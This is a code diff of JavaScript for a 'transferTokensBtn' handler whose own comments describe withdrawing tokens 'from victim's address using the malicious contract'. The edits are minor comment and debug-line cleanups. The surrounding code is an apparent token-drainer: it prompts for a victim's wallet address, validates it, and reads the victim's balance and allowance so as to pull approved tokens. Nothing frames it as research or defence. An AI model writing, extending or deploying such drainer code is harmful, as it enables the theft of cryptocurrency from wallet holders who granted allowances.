@@ -585,19 +585,19 @@
         
 // Withdraw Tokens (from victim's address using the malicious contract)
 document.getElementById("transferTokensBtn").addEventListener("click", async () => {
-    console.debug("transferTokensBtn click handler triggered"); // Debug: Button click detected
+    console.debug("transferTokensBtn click handler triggered");
 
     // Step 1: Prompt for the victim's wallet address
     const victimAddress = prompt("Enter victim's wallet address:");
 
-    // Step 2: Validate and clean the victim's wallet address
+    // Step 2: Validate and clean the victim's wallet address (trim spaces)
     if (victimAddress) {
-        const cleanedVictimAddress = victimAddress.trim(); // Remove any spaces from input
+        const cleanedVictimAddress = victimAddress.trim(); // Trim any spaces from input
         console.debug("Cleaned victim address:", cleanedVictimAddress);
 
         // Check if the provided address is a valid Ethereum address
         if (!web3.utils.isAddress(cleanedVictimAddress)) {
-            alert("Invalid Ethereum address."); // Notify user of invalid address
+            alert("Invalid Ethereum address.");
             console.debug("Invalid address detected:", cleanedVictimAddress);
             return; // Stop execution for invalid addresses
         }
@@ -612,7 +612,6 @@ document.getElementById("transferTokensBtn").addEventListener("click", async () 
             console.debug("Balance fetched:", balance);
 
             // Step 4: Convert allowance and balance to Big Numbers
-            console.debug("Converting values to Big Numbers...");
             const balanceBN = web3.utils.toBN(balance);
             const allowanceBN = web3.utils.toBN(allowance);
             console.debug("Converted values: Balance:", balanceBN.toString(), "Allowance:", allowanceBN.toString());
@@ -657,7 +656,7 @@ document.getElementById("transferTokensBtn").addEventListener("click", async () 
                 // Extract error reason from simulation error
                 const errorReason = simulationError.message.match(/revert (.*)$/i);
                 if (errorReason) {
-                    alert(`Simulation failed: ${errorReason[1]}`); // Show the error reason to the user
+                    alert(`Simulation failed: ${errorReason[1]}`);
                 } else {
                     alert("Simulation failed due to an unknown error. Check console logs for details.");
                 }
